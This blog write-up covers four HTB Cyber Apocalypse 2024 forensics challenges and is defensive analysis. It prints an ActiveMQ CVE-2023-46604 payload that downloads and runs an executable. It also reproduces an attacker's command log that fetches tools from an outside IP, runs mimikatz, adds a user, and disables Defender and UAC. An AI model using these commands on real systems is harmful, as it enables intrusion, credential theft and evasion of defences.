---
weight: 5
title: "HTB Cyber Apocalypse 2024"
date: 2024-03-12T03:28:00+07:00
lastmod: 2024-03-12T03:28:00+07:00
draft: false
author: "tr4c3datr4il"
description: "Some Forensics challenges in HTB Cyber Apocalypse 2024"
images: []
resources:
- name: "featured-image"
  src: "featured-image.png"

tags: ["Forensics"]
categories: ["WriteUps"]

twemoji: false
lightgallery: true
---

Some Forensics challenges in HTB Cyber Apocalypse 2024

<!--more-->

### Preface

Hi guys, it's me again. It's been a while since I wrote writeups. University's projects, CTF events, ..., I'm currently up to my neck right now. ~~But the most important thing is that I'm lazy.~~ Anyway, I have participated in Hack The Box Cyber Apocalypse: Hacker Royale this weekend with WannaW1n. It's a big event in March 2024 and a fun event to begin as a beginner. Because ~~I'm lazy~~ I don't have much time so I will write about 4 last challenges of Forensics. Here we go...

{{< image src="images/writeups/htb_ca_2024/foren.png" caption="Figure" >}}

### Data Siege

{{< admonition >}}
It was a tranquil night in the Phreaks headquarters, when the entire district erupted in chaos. Unknown assailants, rumored to be a rogue foreign faction, have infiltrated the city's messaging system and critical infrastructure. Garbled transmissions crackle through the airwaves, spewing misinformation and disrupting communication channels. We need to understand which data has been obtained from this attack to reclaim control of the and communication backbone. Note: flag is splitted in three parts.
{{< /admonition >}}

We only have a packet capture as the evidence.

{{< image src="images/writeups/htb_ca_2024/pcap1.png" caption="Evidence" >}}

As you can see in the above image, there are some strange HTTP connections to the IP `10.10.10.21`.

{{< image src="images/writeups/htb_ca_2024/pcap1_1.png" caption="Strange requests" >}}

I decided to extract those things out.

The first request was to get a file from this URL `http://10.10.10.21:8080/nBISC4YJKs7j4I`. The file's content look like this:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
<bean id="WHgLtpJX" class="java.lang.ProcessBuilder" init-method="start">
  <constructor-arg>
    <list>
      <value>cmd.exe</value>
      <value>/c</value>
      <value><![CDATA[powershell Invoke-WebRequest 'http://10.10.10.21:8000/aQ4caZ.exe' -OutFile 'C:\temp\aQ4caZ.exe'; Start-Process 'c:\temp\aQ4caZ.exe']]></value>
    </list>
  </constructor-arg>
</bean>
</beans>
```

This is the RCE payload that exploit Apache ActiveMQ vulnerability (CVE-2023-46604). From this payload, threat actor continue downloading `aQ4caZ.exe` file from the same URL.

Here is the output of DIE:

{{< image src="images/writeups/htb_ca_2024/die1.png" caption="Malicious Executable" >}}

We've known this is a C# dotnet executable so let's move on to dnSpy for further analysis.

{{< image src="images/writeups/htb_ca_2024/ezrat.png" caption="EzRAT Sample" >}}

So this is an EzRAT sample, a C2 malware back in 2020: [Link](https://github.com/Exo-poulpe/EZRAT)

At this point, I knew we had to decrypt the traffic which was between the server and the victim.

You can see in this part of the code, the agent connect to the C2 server using socket with pre-defined IP and port in constants.

{{< image src="images/writeups/htb_ca_2024/code_rat1.png" caption="Get server's information" >}}

{{< image src="images/writeups/htb_ca_2024/code_rat2.png" caption="IP and port of the server" >}}

And that is the server's IP and port number. We can use a simple filter to the pcap and follow its stream to display the encrypted traffic:

{{< image src="images/writeups/htb_ca_2024/pcap1_2.png" caption="Encrypted traffic" >}}

Back to the malware, after it connected to the server, the agent will wait for server's commands in `RequestLoop()` method. 

{{< image src="images/writeups/htb_ca_2024/code_rat3.png" caption="Program's flow" >}}

{{< image src="images/writeups/htb_ca_2024/code_rat4.png" caption="Receive and wait for connection" >}}

When it received the response, the data will be transfered to `GetCommand()` function for further processing. After that, it will be execute by `HandleCommand()`

{{< image src="images/writeups/htb_ca_2024/code_rat5.png" caption="Handling buffer" >}}

The buffer will be splited into two parts by this character '§'. The first part is the len of the encrypted buffer. The second is the buffer we need to decrypt it.

{{< image src="images/writeups/htb_ca_2024/code_rat6.png" caption="Handling buffer" >}}

This is the decrypt function, the encryption will use the same parameter so I just show you this part.

{{< image src="images/writeups/htb_ca_2024/code_rat7.png" caption="Decrypt function" >}}

You can get `encryptKey` in the defined constants `Constantes.EncryptKey`. That's all we need to decrypt the traffic.

Here is a simple code that decrypt the challenge's encrypted traffic.

```py
from Crypto.Cipher import AES
from Crypto.Util.Padding import *
from Crypto.Protocol import KDF
import pyshark
import base64


password = b'VYAemVeO3zUDTL6N62kVA'
salt = bytes([
    86, 101, 114, 121, 95, 83, 51, 99, 114, 51,
    116, 95, 83
])

derived_bytes = KDF.PBKDF2(password, salt, dkLen=48)
key = derived_bytes[:32]
iv = derived_bytes[32:]


pcap = pyshark.FileCapture('capture.pcap',
                           display_filter='tcp.port == 1234')

server_cmd = []
client_response = []

for packet in pcap:
    ip_source = packet['IP'].get_field("ip.src")
    data = packet['TCP'].get_field("tcp.payload")
    
    
    if data == None:
        continue
    
    data = bytes.fromhex(data.replace(':', ''))
    
    if ip_source == '10.10.10.22':
        client_response.append(data)
    else:
        server_cmd.append(data)


for i in range(len(server_cmd) - 1):
    split_char = '§' # 0xA7
    Cipher = AES.new(key, AES.MODE_CBC, iv)

    if i == 12: # Last packet
        data = base64.b64decode(server_cmd[12])[16:].decode()
        print("SERVER: Transfer file to client.", "FILE DATA:", f"{data}", sep='\n')
        break
    
    data = base64.b64decode(server_cmd[i].split(b'\xa7')[1])
    command = unpad(Cipher.decrypt(data), AES.block_size)
    
    data = base64.b64decode(client_response[i])
    response = Cipher.decrypt(data)[16:]
    
    print(f"SERVER: {command}", f"CLIENT: {response}", sep='\n')
```

Combining three parts of the flag, we will get the final flag.

### Game Invitation

{{< admonition >}}
In the bustling city of KORP™, where factions vie in The Fray, a mysterious game emerges. As a seasoned faction member, you feel the tension growing by the minute. Whispers spread of a new challenge, piquing both curiosity and wariness. Then, an email arrives: "Join The Fray: Embrace the Challenge." But lurking beneath the excitement is a nagging doubt. Could this invitation hide something more sinister within its innocent attachment?
{{< /admonition >}}

This challenge is about Visual Basic for Application. The only evidence is a `docm` file which has malicious vba code. We will use `olevba` to extract the code from it, pretty easy right?

{{< image src="images/writeups/htb_ca_2024/olevba.png" caption="Figure" >}}

As you can see, the code is obfuscated a little bit but it ain't a big problem. The attacker just changed only the variable's name but not the logic of the function. If you want a cleaner code, just change the name to something that suit you. Now I will explain what those functions do.

{{< image src="images/writeups/htb_ca_2024/vba1.png" caption="Figure" >}}

The code will check the victim's domain, if is not `GAMEMASTERS.local`, the code will not run the next part

{{< image src="images/writeups/htb_ca_2024/vba2.png" caption="Figure" >}}

VBA will take a part of the document then xor it. After that it write to `mailform.js` and execute the jscript in `%appdata%\Microsoft\Windows`.

{{< image src="images/writeups/htb_ca_2024/vba3.png" caption="Figure" >}}

{{< image src="images/writeups/htb_ca_2024/vba4.png" caption="Dropping another malicious code" >}}

That's how the malicious code works. From this point, you can write a script to recover the payload or you can remove the `if` condition statement which checks the hostname, this will make the code write out the javascript file automatically.

{{< image src="images/writeups/htb_ca_2024/jscript.png" caption="The first jscript file" >}}

The jscript is not quite complicated than the previous one as we can do the trick to make it print out the next script, by replacing `eval()` with `Wscript.Echo()`. You need to run this by using `cscript.exe` to print it in your terminal. On the other hand, if you run with `wscript.exe`, you will get a message box.

Despite using the trick, you can manually decrypt this one because it uses simple functions.

Here is how they work. Just focus on two core functions: `JrvS()` and `xR68()`

The first one is just the base64 decode function:

```js
function JrvS(r) {
  var a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var t;
  var l;
  var h;
  if (r.length % 4 > 0) return;
  var u = r.length;
  var g = r.charAt(u - 2) === "=" ? 2 : r.charAt(u - 1) === "=" ? 1 : 0;
  var n = new Array((r.length * 3) / 4 - g);
  var i = g > 0 ? r.length - 4 : r.length;
  var z = 0;
  function b(r) {
    n[z++] = r;
  }
  for (t = 0, l = 0; t < i; t += 4, l += 3) {
    h =
      (af5Q(r.charAt(t)) << 18) |
      (af5Q(r.charAt(t + 1)) << 12) |
      (af5Q(r.charAt(t + 2)) << 6) |
      af5Q(r.charAt(t + 3));
    b((h & 16711680) >> 16);
    b((h & 65280) >> 8);
    b(h & 255);
  }
  if (g === 2) {
    h = (af5Q(r.charAt(t)) << 2) | (af5Q(r.charAt(t + 1)) >> 4);
    b(h & 255);
  } else if (g === 1) {
    h =
      (af5Q(r.charAt(t)) << 10) |
      (af5Q(r.charAt(t + 1)) << 4) |
      (af5Q(r.charAt(t + 2)) >> 2);
    b((h >> 8) & 255);
    b(h & 255);
  }
  return n;
}
```
And the second one is the RC4 function:

```js
function xR68(r, a) {
  var t = [];
  var l = 0;
  var h;
  var u = "";
  for (var g = 0; g < 256; g++) {
    t[g] = g;
  }
  for (var g = 0; g < 256; g++) {
    l = (l + t[g] + r.charCodeAt(g % r.length)) % 256;
    h = t[g];
    t[g] = t[l];
    t[l] = h;
  }
  var g = 0;
  var l = 0;
  for (var n = 0; n < a.length; n++) {
    g = (g + 1) % 256;
    l = (l + t[g]) % 256;
    h = t[g];
    t[g] = t[l];
    t[l] = h;
    u += String.fromCharCode(a[n] ^ t[(t[g] + t[l]) % 256]);
  }
  return u;
}
```

The RC4 function will take a passphrase from the previous VBA code. It is the argument of this file:

{{< image src="images/writeups/htb_ca_2024/vba5.png" caption="RC4 key" >}}

I used cyberchef to do my job. Using RC4 with the given password and base64 decode function, you will have this:

{{< image src="images/writeups/htb_ca_2024/cyberchef.png" caption="Flag" >}}

The final flag is in that script too!

### Confinement

{{< admonition >}}
Our clan's network has been infected by a cunning ransomware attack, encrypting irreplaceable data essential for our relentless rivalry with other factions. With no backups to fall back on, we find ourselves at the mercy of unseen adversaries, our fate uncertain. Your expertise is the beacon of hope we desperately need to unlock these encrypted files and reclaim our destiny in The Fray.

Note: The valuable data is stored under \Documents\Work
{{< /admonition >}}

This is a challenge from @bquanman my idol 🥰

Moving on to this challenge, we will meet a ransomware. Just like other similar cases, we will have to decrypt the encrypted files if possible. But first, let's find the threat.

We have an `ad1` image. It is AccessData Logical Image ([Ref](https://tmairi.github.io/posts/dissecting-the-ad1-file-format/)). Basically, it is just a disk image file, we will use FTK Imager to load these file. For Autopsy, we will use FTK to mount these images first and then, use Autopsy to analyse as logical files.

Let's take a deep dive into this case. The victim has mentioned the valuable data is stored under "\Documents\Work".

{{< image src="images/writeups/htb_ca_2024/autopsy.png" caption="Encrypted file" >}}

The encrypted files has an extension `.korp`. In addtion, we have `ULTIMATUM.hta` as a note from the ransomware group.

{{< image src="images/writeups/htb_ca_2024/note.png" caption="Ransomware Note" >}}

In the `Downloads` folder, we have `ats_setup.bat` which was intialized a reverse shell connection to the attacker. This is the result from a download action which you can see in Edge browser's history. This is the initial access phase from TA.

{{< image src="images/writeups/htb_ca_2024/sus_bat.png" caption="Reverse Shell" >}}

The attacker used powershell as the default shell when get a connection from the victim. But there is no Powershell folder in `%appdata%\Windows\` path so we can not get a log from there.

The second way is from Windows Event log. I used `chainsaw` for this process.

```powershell
$ whoami
$ systeminfo
$ net user /domain
$ net user
$ net user Guess password /ADD
$ Set-LocalUser -Name Guess -PasswordNeverExpires $true
$ pwd
$ ipconfig
$ cd C:\User
$ cd C:\Users
$ dir
$ cd tommyxiaomi
$ cd Documents
$ dir
$ Invoke-WebRequest -URI "http://13.53.200.146/intel.zip" -OutFile "./intel.zip"
$ dir
$ '&"C:\Program Files\7-Zip\7z.exe" x -p hoilamgi intel.zip'
$ '&"C:\Program Files\7-Zip\7z.exe" x -phoilamgi intel.zip'
$ dir
$ ./mimikatz.exe
$ ./fscan64.exe
$ dir
$ dir
$ dir
$ '& "./intel.exe"'
$ dir
$ Get-MpComputerStatus | select IsTamperProtected
$ Get-MpPreference -MAPSReporting 0
$ Set-MpPreference -MAPSReporting 0
$ Set-MpPreference -DisableRealtimeMonitoring $true
$ Get-MpComputerStatus | Select-Object -Property Antivirusenabled,AMServiceEnabled,AntispywareEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled,NISEnabled,OnAccessProtectionEnabled,RealTimeProtectionEnabled,IsTamperProtected,AntivirusSignatureLastUpdated
$ 'Dism '
$ Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet
$ New-ItemProperty -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
$ Set-MpPreference -DisableRemovableDriveScanning $true
$ Set-MpPreference -DisableArchiveScanning $True
$ Get-MpPreference|select DisableArchiveScanning
$ Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL
$ cmd.exe /c "C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
$ Set-MpPreference -DisableRealtimeMonitoring $true
$ Set-MPPreference -DisableBehaviourMonitoring $true
$ Add-MpPreference -ExclusionPath 'C:\Users\tommyxiaomi\Documents' -ExclusionExtension '.exe' -Force
$ Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Users\tommyxiaomi\Documents"
$ '&"C:\Program Files\7-Zip\7z.exe" x -phoilamgi intel.zip'
$ dir
$ ./browser-pw-decrypt.exe
$ ./browser-pw-decrypt.exe all
$ '& "./intel.exe"'
$ dir
$ cd report
$ dir
$ cd ..
$ dir
$ rm ./*.exe -force
$ dir
$ rm intel.zip -force
$ dir
$ exit
```

After getting a connection from the victim, TA continue downloading a password-protected zip file named `intel.zip`. He decompressed the file and ran some executables in it. One is the `browser-pw-decrypt.exe`, maybe this is for browser's credentials extraction. Another one is `intel.exe`, I guess this is the ransomware. `./mimikatz.exe` is used to extract LSASS secret and `fscan64.exe` maybe for connection scanning? When finished, the attacker deleted all of the associated files which make us likely have no chance to obtain the malware.

Now the question is: Where is the intel.zip? We have known that the attacker had erased it from the system. BUT, before running those executables, TA ran some commands to disable the Windows Defender! From this point, we can actually recover the ransomware if it was quarantined by the Defender. Let's check the Windows Defender folder.

{{< image src="images/writeups/htb_ca_2024/defender.png" caption="Defender directory" >}}

We have almost of the critical evidences in this folder. The important file is in `Quarantine` and we have to decrypt it. ([Ref](https://jon.glass/blog/quarantines-junk/))

I used this tool to recover the malware: [Link](https://github.com/zam89/Windows-Defender-Quarantine-File-Decryptor)

Okay we have the malware now. Let's reverse it!

This is the function will recusively enumerate in the directory to encrypt files. It takes some valid extension to encrypt, some are not, e.g: .korp, .hta or desktop.ini file.

{{< image src="images/writeups/htb_ca_2024/ransomware1.png" caption="Encrypt function" >}}

The function calls another one which is `coreEncrypter.EncryptFile()`. In this function, we can see it intializes AES-CBC-256 as the core encrypter.

{{< image src="images/writeups/htb_ca_2024/ransomware2.png" caption="Figure" >}}

The password is used for the deriving phase is generated in the `Main()` function of the program.

{{< image src="images/writeups/htb_ca_2024/ransomware3.png" caption="Figure" >}}

Although the UID was generated randomly, we still can recover it from `ULTIMATUM.hta` file as the ransomware writes UID to that file in `alert.ValidateAlert()`.

{{< image src="images/writeups/htb_ca_2024/ransomware4.png" caption="Random UID generation" >}}

Now we have all of the important parameters to decrypt the files. Here is the script that can be used to do that process.

```py
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.Protocol import KDF
from hashlib import sha512
import base64

def Hasher(text):
    h = sha512(text.encode() + b'0f5264038205edfb1ac05fbb0e8c5e94').digest()
    
    return base64.b64encode(h).decode()

salt = bytes([
    0, 1, 1, 0, 1, 1, 0, 0
])

password = Hasher("5K7X7E6X7V2D6F")
derived_bytes = KDF.PBKDF2(password, salt, dkLen=48, count=4953)
key = derived_bytes[:32]
iv = derived_bytes[32:]

print(key.hex(), iv.hex(), sep='\n')

enc_data = open('Applicants_info.xlsx.korp', 'rb').read()
Cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = Cipher.decrypt(enc_data)
with open('Applicants_info.xlsx', 'wb') as out:
    out.write(unpad(plaintext, AES.block_size))
```

{{< image src="images/writeups/htb_ca_2024/excel.png" caption="Flag" >}}

The flag is in that Excel file.

### Oblique Final

As the days for the final round of the game, draw near, rumors are beginning to spread that one faction in particular has rigged the final! In the meeting with your team, you discuss that if the game is indeed rigged, then there can be no victory here... Suddenly, one team player barged in carrying a Windows Laptop and said they found it in some back room in the game Architects' building just after the faction had left! As soon as you open it up it turns off due to a low battery! You explain to the rest of your team that the Legionnaires despise anything unethical and if you expose them and go to them with your evidence in hand, then you surely end up being their favorite up-and-coming faction. "Are you Ready To Run with the Wolves?!"

In the last challenge, we have to recover the "backdoor" in a given memory image. That files is a hibernation file. 

In order to analysing this image, you will have to use `Hibr2Bin.exe` from Magnet or using Volatility 3 version from [ForensicXLab](https://www.forensicxlab.com/posts/hibernation/). The first solution caused me some troubles so I had to downgrade my Volatility version.

// image

From the process list, the most suspicious process here is just `TheGame.exe`. Its location is in `C:\Users\architect\Desktop\publish`. But you can see from the `dumpfiles` plugin, "publish" folder has more suspicious files than TheGame.exe itself. By enumerating this folder, you will find out that this is actually a project that was generated by Visual Studio.

// image

I checked the handles of TheGame process and saw an intersting result:

// image

Yup this is a very familiar DLL call.

We must dump out those two files to proceed to the next stage: `TheGame.exe` and `TheGame.dll`. 

I ran DIE to detect what kind of that DLL is:

// image

I always love dotnet assembly. Let's check it out.

// image

When we load this file to dnSpy, we can catch up to something like this:

// image

Strange isn't it? So dnSpy can't decompile this file properly even though some dll exporting and constants can be that clear.

// image

I decided to give ILSpy a try.

// image

And it worked perfectly!

In this code, there is nothing more than some AMSI check functions. The base64 string is just an EICAR's test string that people used to test the antivirus ([Ref](https://en.wikipedia.org/wiki/EICAR_test_file)). Nothing in this code seem malicious.

```csharp
```
There is actually a very weird part in this code. Here it is:

// image

Why did ILSpy give us something like this? At that moment, I couldn't understand what its really mean. 

I spent a day viewing, doing stupid things in this dll and also TheGame.exe but its just a loader for TheGame.dll. For others dll, I didn't see anything suspicious too.

In the next day, I found this interesting [blog post](https://research.checkpoint.com/2023/r2r-stomping-are-you-ready-to-run/). 

TL;DR: The blog was about a technique that is used to hide .NET opcodes from some .NET assembly editor like dnSpy.

From this blog, there is two thing that we need to pay attention to.

// image

The challenge's DLL is the second. How can we extract the malicious code? Just use the IDA and press F5 👀

// image

The function at the line xxx is the function we need to looking for. After doing the decryption, which is a xor function with the given key and ciphertext, we will get a cmd command has a flag in it. This command will be executed later by calling `WinExec` at the line xxx. That's all!

I'm sorry for this careless writeup about the last challenge. Because I'm not a Reverse guy 🥲. That's all I can do for you guys to get a better view of this challenge. See you guys in the next post!

BTW, Happy Hunting ~